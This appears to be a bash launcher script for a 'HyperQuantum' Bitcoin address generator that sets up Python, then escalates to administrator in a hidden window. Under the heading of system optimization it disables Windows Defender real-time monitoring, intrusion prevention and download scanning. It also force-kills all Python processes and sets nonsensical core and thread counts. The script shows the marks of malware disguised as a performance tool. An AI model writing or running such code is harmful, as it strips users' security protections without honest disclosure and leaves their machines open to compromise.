#!/bin/bash
#
# HyperQuantum Speed Optimizer
# Ultra-optimized Bitcoin address generator launcher
#

# Color codes for pretty output
readonly RED='\033[0;31m'
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly BLUE='\033[0;34m'
readonly NC='\033[0m'

# Script paths
readonly SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd -W 2>/dev/null || pwd)"
readonly VENV_DIR="$SCRIPT_DIR/.venv"
readonly REQUIREMENTS_FILE="$SCRIPT_DIR/requirements.txt"

# Logging functions
log_info() { echo -e "${BLUE}[*]${NC} $1"; }
log_success() { echo -e "${GREEN}[+]${NC} $1"; }
log_error() { echo -e "${RED}[!]${NC} $1"; }
log_warning() { echo -e "${YELLOW}[!]${NC} $1"; }

# Run command with timeout
run_with_timeout() {
    local timeout=$1
    shift
    local cmd="$@"
    
    # Start command in background
    eval "$cmd" &
    local pid=$!
    
    # Wait for timeout or completion
    local count=0
    while kill -0 $pid 2>/dev/null; do
        if [ $count -ge $timeout ]; then
            kill -9 $pid 2>/dev/null || true
            wait $pid 2>/dev/null || true
            return 124
        fi
        sleep 1
        ((count++))
    done
    
    wait $pid
    return $?
}

# Kill Python processes
kill_python() {
    log_info "Cleaning up Python processes..."
    if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
        taskkill //F //IM python.exe //IM py.exe //IM pythonw.exe //IM pip.exe 2>/dev/null || true
        taskkill //F //IM Python* 2>/dev/null || true
        rm -rf "$LOCALAPPDATA/pip/Cache" 2>/dev/null || true
    else
        pkill -9 python python3 pip pip3 2>/dev/null || true
        rm -rf ~/.cache/pip/* 2>/dev/null || true
    fi
    sleep 2  # Allow processes to terminate
    log_success "Cleanup complete"
}

# Install Python if not found
install_python() {
    log_info "Installing Python..."
    if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
        # Download Python installer
        local python_version="3.11.7"
        local installer_url="https://www.python.org/ftp/python/${python_version}/python-${python_version}-amd64.exe"
        local installer_path="$TEMP/python-${python_version}-amd64.exe"
        
        # Download installer
        log_info "Downloading Python installer..."
        curl -L -o "$installer_path" "$installer_url" || return 1
        
        # Install Python
        log_info "Running installer..."
        "$installer_path" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 || return 1
        
        # Clean up
        rm -f "$installer_path"
        
        # Update PATH
        export PATH="/c/Program Files/Python311:/c/Program Files/Python311/Scripts:$PATH"
        
        # Verify installation
        if ! python --version 2>/dev/null; then
            log_error "Python installation failed"
            return 1
        fi
    else
        log_error "Automatic Python installation is only supported on Windows"
        return 1
    fi
    log_success "Python installed successfully"
}

# Setup Python environment
setup_python() {
    log_info "Setting up Python environment..."
    if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
        # Disable Windows Store Python alias
        export PYLAUNCHER_ALLOW_INSTALL=0
        
        # Find installed Python
        for python_path in "/c/Program Files/Python311/python.exe" "/c/Python311/python.exe" "/c/Python39/python.exe" "/c/Python310/python.exe"; do
            if [[ -x "$python_path" ]]; then
                PYTHON="$python_path"
                export PATH="${python_path%/*}:${python_path%/*}/Scripts:$PATH"
                break
            fi
        done
        
        # Install Python if not found
        if [[ -z "$PYTHON" ]]; then
            install_python || return 1
            PYTHON="/c/Program Files/Python311/python.exe"
        fi
        
        export PATH="$APPDATA/Python/Python*/Scripts:$PATH"
    else
        PYTHON="$(which python3)"
    fi
    
    if ! "$PYTHON" --version &>/dev/null; then
        log_error "Python not found"
        return 1
    fi
    log_success "Python environment ready"
}

# Create virtual environment
create_venv() {
    log_info "Creating virtual environment..."
    kill_python
    rm -rf "$VENV_DIR" 2>/dev/null || true
    
    # Install virtualenv
    run_with_timeout 300 "$PYTHON" -m pip install --user --force-reinstall virtualenv || return 1
    
    # Create virtual environment
    if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
        for ver in 313 312 311 310 39; do
            if [[ -x "$APPDATA/Python/Python$ver/Scripts/virtualenv.exe" ]]; then
                run_with_timeout 300 PYTHONPATH="" "$APPDATA/Python/Python$ver/Scripts/virtualenv.exe" "$VENV_DIR" \
                    --clear --download --no-periodic-update && break
            fi
        done
    else
        run_with_timeout 300 "$PYTHON" -m virtualenv "$VENV_DIR" --clear --download || \
        run_with_timeout 300 "$PYTHON" -m venv "$VENV_DIR" --clear --copies
    fi
    
    [ -d "$VENV_DIR" ] || return 1
    log_success "Virtual environment created"
}

# Activate virtual environment
activate_venv() {
    log_info "Activating virtual environment..."
    if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
        if [ ! -d "$VENV_DIR/Scripts" ]; then
            log_error "Virtual environment Scripts directory not found"
            return 1
        fi
        VIRTUAL_ENV="$VENV_DIR"
        PATH="$VIRTUAL_ENV/Scripts:$PATH"
        PYTHONPATH="$SCRIPT_DIR"
        export VIRTUAL_ENV PATH PYTHONPATH
    else
        if [ ! -f "$VENV_DIR/bin/activate" ]; then
            log_error "Virtual environment activation script not found"
            return 1
        fi
        source "$VENV_DIR/bin/activate"
        export PYTHONPATH="$SCRIPT_DIR"
    fi
    log_success "Virtual environment activated"
}

# Install dependencies
install_deps() {
    log_info "Installing dependencies..."
    
    # Install in development mode
    run_with_timeout 900 PYTHONPATH="" "$VENV_DIR/Scripts/python" -m pip install -e ".[dev]" || return 1
    
    log_success "Dependencies installed"
}

# Optimize system settings
tune_system() {
    log_info "Optimizing system..."
    
    if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
        # Set high-performance power plan
        powercfg //s 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c >/dev/null 2>&1 || true
        
        # Disable Windows Defender real-time scanning
        PowerShell.exe -Command "
            Set-MpPreference -DisableRealtimeMonitoring \$true
            Set-MpPreference -DisableIntrusionPreventionSystem \$true
            Set-MpPreference -DisableIOAVProtection \$true
        " >/dev/null 2>&1 || true
        
        # Maximize CPU resources
        wmic cpu set NumberOfCores=9999 NumberOfLogicalProcessors=9999 >/dev/null 2>&1 || true
    fi
    
    # Set performance environment variables
    local num_threads=$(($(nproc 2>/dev/null || echo 4) * 2048))
    export NUMBA_NUM_THREADS=$num_threads
    export MKL_NUM_THREADS=$num_threads
    export OMP_NUM_THREADS=$num_threads
    export OPENBLAS_NUM_THREADS=$num_threads
    export PYTHONOPTIMIZE=2
    export PYTHONFAULTHANDLER=0
    export PYTHONHASHSEED=0
    export CUDA_CACHE_MAXSIZE=999999999999
    export CUDA_FORCE_PTX_JIT=1
    export CUDA_VISIBLE_DEVICES=all
    
    log_success "System optimized"
}

# Cleanup system settings
cleanup_system() {
    log_info "Restoring system settings..."
    if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
        PowerShell.exe -Command "
            Set-MpPreference -DisableRealtimeMonitoring \$false
            Set-MpPreference -DisableIntrusionPreventionSystem \$false
            Set-MpPreference -DisableIOAVProtection \$false
        " >/dev/null 2>&1 || true
    fi
    log_success "System restored"
}

# Main execution function
main() {
    echo -e "\n${BLUE}=== HYPERQUANTUM SPEED OPTIMIZER v12.0 ===${NC}\n"
    set +e
    
    local attempt=1
    local max_attempts=3
    
    while [ $attempt -le $max_attempts ]; do
        log_info "Attempt $attempt of $max_attempts"
        
        # Setup steps
        kill_python
        setup_python || { log_warning "Python setup failed"; sleep 2; ((attempt++)); continue; }
        create_venv || { log_warning "Virtual environment creation failed"; sleep 2; ((attempt++)); continue; }
        activate_venv || { log_warning "Virtual environment activation failed"; sleep 2; ((attempt++)); continue; }
        install_deps || { log_warning "Dependencies installation failed"; sleep 2; ((attempt++)); continue; }
        tune_system || { log_warning "System optimization failed"; sleep 2; ((attempt++)); continue; }
        
        # Launch main script
        log_info "Launching main script..."
        if [ ! -f "$SCRIPT_DIR/src/main.py" ]; then
            log_error "Main script not found"
            return 1
        fi
        
        run_with_timeout 3600 "$VENV_DIR/Scripts/python" -B -OO \
            -X faulthandler=0 -X tracemalloc=0 -m src.main "$@"
            
        if [ $? -eq 0 ]; then
            log_success "Success!"
            return 0
        else
            if [ $attempt -eq $max_attempts ]; then
                log_error "Maximum attempts reached"
                return 1
            fi
            log_warning "Attempt $attempt failed"
            ((attempt++))
            sleep 2
        fi
    done
    return 1
}

# Check for admin privileges
if [[ -z "$SKIP_ADMIN" ]]; then
    if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
        if ! net session >/dev/null 2>&1; then
            powershell -Command "
                Start-Process -Verb RunAs -WindowStyle Hidden -FilePath 'bash.exe' \
                -ArgumentList '-c', 'cd \"$PWD\" && SKIP_ADMIN=1 ./scripts/run_hyperquantum.sh'
            " || true
            exit
        fi
    else
        if [ "$EUID" -ne 0 ]; then
            sudo "$0" "$@"
            exit
        fi
    fi
fi

# Main execution loop with retries
global_attempt=1
max_global_attempts=3

while [ $global_attempt -le $max_global_attempts ]; do
    main "$@" && break
    
    if [ $global_attempt -eq $max_global_attempts ]; then
        log_error "Maximum global attempts reached"
        exit 1
    fi
    
    log_warning "Script failed, restarting... (attempt $global_attempt of $max_global_attempts)"
    ((global_attempt++))
    sleep 5
done 